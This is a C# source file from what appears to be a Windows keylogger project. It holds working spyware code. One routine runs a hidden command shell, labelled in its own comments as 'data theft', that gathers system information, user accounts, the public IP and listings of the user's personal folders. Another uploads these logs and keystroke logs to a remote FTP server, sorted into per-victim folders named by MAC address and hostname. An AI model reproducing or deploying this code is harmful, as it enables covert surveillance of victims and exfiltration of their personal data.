using System;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using FluentFTP;
using vrtx_keys;

namespace keylogger {
    class NetworkInteraction {
        public static string GetMacAddress() {
            const int MIN_MAC_ADDR_LENGTH = 12;
            string macAddress = string.Empty;
            long maxSpeed = -1;

            foreach(NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()) {
                string tempMac = nic.GetPhysicalAddress().ToString();
                if(nic.Speed > maxSpeed && !string.IsNullOrEmpty(tempMac) && tempMac.Length >= MIN_MAC_ADDR_LENGTH) {
                    maxSpeed = nic.Speed;
                    macAddress = tempMac;
                }
            }

            return macAddress;
        }

        public static void GetExtraInfo() {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // make similar to daemon
            cmd.Start();

            // Start data theft code execution
            cmd.StandardInput.WriteLine("echo off");
            cmd.StandardInput.WriteLine("title Please hold...");
            cmd.StandardInput.WriteLine("cd %temp%");
            cmd.StandardInput.WriteLine("set filepath=\"%temp%\\sys_data_capture.log\"");
            cmd.StandardInput.WriteLine("if exist \" % filepath % \" ( del %filepath% ) else ( echo Gathering Debugging Informatin )");
            cmd.StandardInput.WriteLine("rem Let's begin the data theft");
            cmd.StandardInput.WriteLine("set >> %filepath%");
            cmd.StandardInput.WriteLine("echo User Profile: %userprofile% >> %filepath%");
            cmd.StandardInput.WriteLine("echo System Root: %systemroot% >> %filepath%");
            cmd.StandardInput.WriteLine("echo Computer Name: %computername% >> %filepath%");
            cmd.StandardInput.WriteLine("echo Username: %username% >> %filepath%");
            cmd.StandardInput.WriteLine("systeminfo >> %filepath%");
            cmd.StandardInput.WriteLine("ipconfig /all >> %filepath%");
            cmd.StandardInput.WriteLine("powershell (Invoke-WebRequest http://ipinfo.io/ip).Content >> %filepath%");
            cmd.StandardInput.WriteLine("net user >> %filepath%");
            cmd.StandardInput.WriteLine("net user %username% >> %filepath%");
            cmd.StandardInput.WriteLine("cd %userprofile%\\Documents");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Videos");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Pictures");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Music");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd ../Desktop");
            cmd.StandardInput.WriteLine("dir >> %filepath%");
            cmd.StandardInput.WriteLine("cd \\");

            // End data theft code execution
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
            cmd.Close();
            Console.Clear();
        }

        public static bool CheckInternetConnection() {
            try {
                using(var client = new WebClient())
                using(client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch {
                return false;
            }
        }

        public static void FtpUploader(string ftpServer, int ftpPort, string ftpUsername, string ftpPassword, string filepathForUpload, string userFolderFtp, bool uploadType) {
            //Verificando se há conexão à internet
            if(CheckInternetConnection()) {
                //Criando um objeto do tipo FtpClient com as credenciais de acesso do FTP
                using(var client = new FtpClient(ftpServer, ftpPort, ftpUsername, ftpPassword)) {
                    client.Connect(); //Conectando ao FTP
                    Console.WriteLine("FTP Conectado");

                    //Se a pasta da vítima atual ainda não existir, significa que é a primeira vez o keylogger está sendo executado
                    if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp)) {
                        //Então criamos a pasta com o nome identificador (userFolderFtp) no caminho onde ficam armazenados todos os logs das vítimas
                        client.CreateDirectory("/htdocs/loggers/" + userFolderFtp, true);
                    }

                    string ftpFilepathTarget;
                    client.RetryAttempts = 3; //Máxima de tentativas de upload = 3

                    //Caso o tipo de upload for de arquivo do sistema
                    if(uploadType == KeyboardListener.sysUpload) {
                        ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/syslog/sys_data_capture.log";

                        if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp + "/syslog")) {
                            //Criando a pasta que irá ficar o arquivo de informações do sistema
                            client.CreateDirectory("/htdocs/loggers/" + userFolderFtp + "/syslog", true);
                        }
                        //Fazendo o upload do arquivo do arquivo de informações do sistema para a sua pasta
                        client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Skip, false, FtpVerify.Retry);
                    }
                    //Caso o tipo de upload for o log das teclas quando o pc é desligado
                    else if(uploadType == KeyboardListener.logUpload) {
                        string nameOfLastItem = string.Empty; //Guarda o nome do último arquivo da pasta da vítima atual
                        bool isFolderEmpty = true; //Guarda se a pasta está vazia

                        //Varrendo a pasta do usuário
                        foreach(FtpListItem item in client.GetListing("/htdocs/loggers/" + userFolderFtp)) {
                            if(item.Type == FtpFileSystemObjectType.File) {
                                nameOfLastItem = item.Name; //guarda o nome do último arquivo
                                isFolderEmpty = false; 
                            }
                        }

                        if(isFolderEmpty) {
                            ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/1#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
                        }
                        else {
                            int idLog = int.Parse(nameOfLastItem.Substring(0, 1)) + 1; //Pegando qual é a próxima versão do log de teclas (id do arquivo)
                            ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/" + idLog + "#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
                        }
                    }

                    Console.WriteLine("FTP Concluído");
                    //Desconectando do FTP
                    client.Disconnect();
                }
            }
        }
    }
}